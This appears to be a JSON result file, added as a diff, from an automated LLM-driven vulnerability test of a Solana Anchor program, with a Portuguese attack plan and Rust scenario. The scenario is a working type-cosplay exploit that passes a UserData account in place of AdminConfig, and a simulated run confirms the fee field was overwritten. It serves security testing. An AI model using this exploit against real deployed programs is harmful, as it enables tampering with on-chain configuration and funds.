@@ -1,0 +1,68 @@
+{
+  "category": "COSPLAY",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: fee da conta UserData foi sobrescrito para 777 (type cosplay)",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2152,
+        "completion_tokens": 678,
+        "latency_s": 4.09
+      },
+      "raw": "{\"plan\": \"O programa usa UncheckedAccount para `config` e le bytes crus nos offsets 8..40 (admin) e 40..48 (fee). A hipotese COSPLAY e que uma conta de outro tipo (UserData) com o mesmo layout de 8 bytes de discriminador + 32 bytes de authority + 8 bytes de balance seja aceita no lugar de AdminConfig. Vou preparar uma conta AdminConfig legitima com admin = authority e chamar baseline update_fee com sucesso. Depois, no ataque, passo uma conta UserData cujo campo authority e igual ao signer, mas cujo discriminador e de UserData; se o programa aceitar, o fee (offset 40..48) sera sobrescrito, demonstrando que o tipo nao foi validado.\", \"scenario\": \"let authority = Pubkey::new_unique();\\n\\n// Conta AdminConfig legitima: admin = authority, fee = 100\\nlet config_data = anchor_account_data(\\\"AdminConfig\\\", &(authority, 100u64));\\nlet config_key = Pubkey::new_unique();\\nlet config = account(&env.program_id, &config_data, None);\\n\\nlet metas = vec![\\n    AccountMeta::new(config_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n];\\n\\nlet ix = env.anchor_ix(\\\"update_fee\\\", &(500u64,), metas.clone());\\nlet contas = vec![\\n    (config_key, config.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet r = env.baseline(\\\"update_fee legitimo com AdminConfig\\\", &ix, &contas);\\n\\n// Ataque: conta UserData com authority = signer, mas discriminador de UserData\\nlet fake_data = anchor_account_data(\\\"UserData\\\", &(authority, 999u64));\\nlet fake_key = Pubkey::new_unique();\\nlet fake = account(&env.program_id, &fake_data, None);\\n\\nlet attack_metas = vec![\\n    AccountMeta::new(fake_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n];\\nlet attack_ix = env.anchor_ix(\\\"update_fee\\\", &(777u64,), attack_metas);\\nlet attack_contas = vec![\\n    (fake_key, fake),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet ar = env.attack(\\\"update_fee com UserData no lugar de AdminConfig\\\", &attack_ix, &attack_contas);\\nif ar.program_result == ProgramResult::Success {\\n    let fee = read_u64(after(&ar, &fake_key).data(), 40);\\n    env.effect(\\\"fee da conta UserData foi sobrescrito para 777 (type cosplay)\\\", fee == 777);\\n}\"}",
+      "plan": "O programa usa UncheckedAccount para `config` e le bytes crus nos offsets 8..40 (admin) e 40..48 (fee). A hipotese COSPLAY e que uma conta de outro tipo (UserData) com o mesmo layout de 8 bytes de discriminador + 32 bytes de authority + 8 bytes de balance seja aceita no lugar de AdminConfig. Vou preparar uma conta AdminConfig legitima com admin = authority e chamar baseline update_fee com sucesso. Depois, no ataque, passo uma conta UserData cujo campo authority e igual ao signer, mas cujo discriminador e de UserData; se o programa aceitar, o fee (offset 40..48) sera sobrescrito, demonstrando que o tipo nao foi validado.",
+      "scenario": "let authority = Pubkey::new_unique();\n\n// Conta AdminConfig legitima: admin = authority, fee = 100\nlet config_data = anchor_account_data(\"AdminConfig\", &(authority, 100u64));\nlet config_key = Pubkey::new_unique();\nlet config = account(&env.program_id, &config_data, None);\n\nlet metas = vec![\n    AccountMeta::new(config_key, false),\n    AccountMeta::new_readonly(authority, true),\n];\n\nlet ix = env.anchor_ix(\"update_fee\", &(500u64,), metas.clone());\nlet contas = vec![\n    (config_key, config.clone()),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet r = env.baseline(\"update_fee legitimo com AdminConfig\", &ix, &contas);\n\n// Ataque: conta UserData com authority = signer, mas discriminador de UserData\nlet fake_data = anchor_account_data(\"UserData\", &(authority, 999u64));\nlet fake_key = Pubkey::new_unique();\nlet fake = account(&env.program_id, &fake_data, None);\n\nlet attack_metas = vec![\n    AccountMeta::new(fake_key, false),\n    AccountMeta::new_readonly(authority, true),\n];\nlet attack_ix = env.anchor_ix(\"update_fee\", &(777u64,), attack_metas);\nlet attack_contas = vec![\n    (fake_key, fake),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet ar = env.attack(\"update_fee com UserData no lugar de AdminConfig\", &attack_ix, &attack_contas);\nif ar.program_result == ProgramResult::Success {\n    let fee = read_u64(after(&ar, &fake_key).data(), 40);\n    env.effect(\"fee da conta UserData foi sobrescrito para 777 (type cosplay)\", fee == 777);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "update_fee legitimo com AdminConfig",
+            "result": "Success",
+            "compute_units": 1493,
+            "account_flags": "-w,sr"
+          },
+          {
+            "step": "attack",
+            "note": "update_fee com UserData no lugar de AdminConfig",
+            "result": "Success",
+            "compute_units": 1493,
+            "account_flags": "-w,sr"
+          },
+          {
+            "step": "effect",
+            "note": "fee da conta UserData foi sobrescrito para 777 (type cosplay)",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP invoke [1]",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP consumed 1493 of 1400000 compute units",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP success",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP invoke [1]",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP consumed 1493 of 1400000 compute units",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: fee da conta UserData foi sobrescrito para 777 (type cosplay)"
+    }
+  ],
+  "case_id": "SSP-06-A-V",
+  "static_finding": {
+    "category": "COSPLAY",
+    "evidence": "",
+    "explanation": "",
+    "attack_hypothesis": "Verificar por execucao se a instrucao e vulneravel a Type Cosplay."
+  }
+}
